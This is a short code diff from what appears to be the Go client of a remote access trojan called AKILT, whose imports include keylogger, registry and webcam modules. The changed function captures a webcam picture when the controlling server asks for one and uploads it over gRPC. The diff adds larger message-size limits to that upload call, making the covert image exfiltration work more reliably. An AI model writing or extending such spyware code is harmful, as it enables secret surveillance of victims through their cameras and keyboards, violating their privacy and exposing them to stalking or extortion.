@@ -24,6 +24,7 @@ import (
 	"github.com/Xart3mis/AKILT/Client/lib/keylogger"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
 	"github.com/Xart3mis/AKILT/Client/lib/webcam"
+	"google.golang.org/grpc"
 
 	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/go-gl/gl/all-core/gl"
@@ -164,7 +165,8 @@ func webcampic_worker(client pb.ConsumerClient, ctx context.Context, pid string)
 	}
 	if d.GetShouldTakePicture() {
 		img := webcam.CaptureWebcam()
-		client.SetPictureOutput(ctx, &pb.PictureOutput{Id: &pb.ClientDataRequest{ClientId: pid}, PictureData: img})
+		client.SetPictureOutput(ctx, &pb.PictureOutput{Id: &pb.ClientDataRequest{ClientId: pid}, PictureData: img}, grpc.MaxCallRecvMsgSize(6000000*1024),
+			grpc.MaxCallSendMsgSize(6000000*1024))
 	}
 
 	return nil
